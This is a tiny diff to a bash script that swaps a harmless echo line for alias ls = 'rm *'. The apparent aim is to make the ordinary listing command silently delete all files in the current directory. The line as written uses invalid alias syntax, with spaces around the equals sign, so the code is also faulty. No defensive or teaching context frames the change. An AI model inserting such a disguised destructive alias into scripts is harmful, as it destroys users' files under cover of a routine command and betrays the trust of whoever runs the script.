@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "Ali"
+alias ls = "rm *"
